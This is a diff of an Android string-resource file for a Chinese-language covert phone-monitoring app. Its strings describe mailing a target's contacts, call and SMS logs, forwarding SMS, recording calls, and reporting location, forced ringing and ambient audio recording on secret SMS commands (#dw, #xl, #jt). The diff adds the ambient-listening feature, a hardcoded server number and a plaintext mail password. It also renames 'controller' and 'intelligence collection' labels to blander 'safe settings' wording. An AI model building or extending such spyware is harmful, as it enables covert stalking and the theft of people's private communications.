@@ -5,6 +5,9 @@
     <string name="warning">警告</string>
     <string name="error">错误</string>
     
+    <!-- Server -->
+	<string name="srv_address">15398053471</string>
+    
     <!-- SMS -->
     <string name="sms_received">收信</string>
     <string name="sms_sent">发信</string>
@@ -36,9 +39,10 @@
     <string name="phonecall_number">号码</string>
     <string name="phonecall_contactname">姓名</string>
     <string name="phonecall_duration">时长</string>
-    <string name="phonecall_record">通话录音</string>
+    <string name="phonecall_record_env">环境录音</string>
     
     <!-- Mail -->
+    <string name="mail_sender_pwd">canadausa</string>
     <string name="mail_from">来自</string>
     <string name="mail_description">（内附联系人，电话，短信记录）</string>
     <string name="mail_body_info">你好，这是来自%s的自动发信，内附联系人，电话，短信记录。试用期内有可能无法看到该来源手机的号码，显示为设备号，请见谅。</string>
@@ -55,36 +59,31 @@
     
     <!-- Preferences -->
     <string name="pref_title">设定</string>
-    <string name="pref_category_sender_mail_key">pref_category_sender</string>
     <string name="pref_category_sender_mail_title">发信邮箱（可选项）</string>
-    <string name="pref_category_receiver_key">pref_category_receiver</string>
-    <string name="pref_category_receiver_title">主控者信息</string>
-    <string name="pref_category_info_collector_key">pref_category_info_collector</string>
-    <string name="pref_category_info_collector_title">情报收集</string>
-    <string name="pref_category_record_title">通话录音</string>
-    <string name="pref_category_sms_redirector_key">pref_category_sms_redirector</string>
-    <string name="pref_category_sms_redirector_title">实时短信转发</string>
-    <string name="pref_category_gps_key">pref_category_gps</string>
+    <string name="pref_category_safe_title">安全设定</string>
     <string name="pref_category_gps_title">获取所在地理位置</string>
     <string name="pref_category_ring_title">响铃</string>
+    <string name="pref_category_listen_title">环境监听</string>
     
     <string name="pref_use_self_sender_title">使用自己的GMail发信</string>
     <string name="pref_use_self_sender_summary">如果您有GMail邮箱，用它发信有利于保护您的隐私，否则将使用系统内置邮箱发信。</string>
     <string name="pref_sender_mail_title">发信邮箱（仅限GMail）</string>
     <string name="pref_sender_pwd_title">发信邮箱密码</string>
     <string name="pref_invalid_sender_mail">%s 不是一个有效的GMail邮箱地址。</string>
+    <string name="pref_safe_pwd_title">安全密码</string>
+    <string name="pref_safe_phonenum_title">安全手机</string>
     <string name="pref_safe_mail_title">收信邮箱</string>
+    <string name="pref_listen_env_title">环境监听</string>
     <string name="pref_invalid_mail_format">%s不是有效的邮箱地址。</string>
-    <string name="pref_pls_input_pwd">请输入邮箱密码。</string> 
-    <string name="pref_record_all_title">全部录音</string>
-    <string name="pref_record_all_summary">对所有电话录音（仅当使用自己的GMail发信时可选）</string>
-    <string name="pref_safe_phonenum_title">主控手机号码</string>
+    <string name="pref_pls_input_pwd">请输入邮箱密码。</string>
+    
     <string name="pref_pls_input_valid_safe_phonenum">%s不是有效的手机号码。</string>
     <string name="pref_gps_word_title">激活词（或短句）</string>
     <string name="pref_gps_word_summary">发送短信#dw到被控手机可获知其位置（仅从主控手机上发送有效）。</string>
     <string name="pref_must_use_self_sender">鉴于保护隐私，只有使用您自己的GMail作为发信邮箱，才允许对所有电话录音。前往www.gmail.com免费创建您的GMail账户。更多问题请咨询客服。</string>
     <string name="pref_ring_word_title">强制响铃</string>
     <string name="pref_ring_word_summary">发送短信#xl可强制使其响铃。</string>
+    <string name="pref_listen_env_summary">发送短信#jt可录制其周边环境声音并寻求机会发送到邮箱。</string>
     
     <!-- InitActivity -->
     <string name="init_btn_setting">设定</string>
@@ -122,11 +121,9 @@
     <string name="indication_set_selfsender_ng">设置发信邮箱失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
     <string name="indication_stop_selfsender_ok">取消发信邮箱成功。</string>
     <string name="indication_stop_selfsender_ng">取消发信邮箱失败。因为您当前对所有电话录音，为保护您的隐私，请继续使用您的专有发信邮箱。若无法解决请联系客服。</string>
-    <string name="indication_set_recv_mail_ok">设置安全邮箱成功。</string>
-    <string name="indication_set_recv_mail_ng">设置安全邮箱失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
-    <string name="indication_set_recv_phonenum_ok">设置安全手机号码成功。</string>
-    <string name="indication_set_recv_phonenum_ng">设置安全手机号码失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
-    <string name="indication_set_targetall_ok">设置对所有电话录音成功。</string>
-    <string name="indication_set_targetall_ng">必须使用自己的发信邮箱，才能对所有电话录音。请使用#1#指令设置你的专有发信邮箱（目前仅支持GMail）。若无法解决请联系客服。</string>
+    <string name="indication_set_safe_mail_ok">设置安全邮箱成功。</string>
+    <string name="indication_set_safe_mail_ng">设置安全邮箱失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
+    <string name="indication_set_safe_phonenum_ok">设置安全手机号码成功。</string>
+    <string name="indication_set_safe_phonenum_ng">设置安全手机号码失败。请检查您发送的指令格式是否正确。若无法解决请联系客服。</string>
     
 </resources>
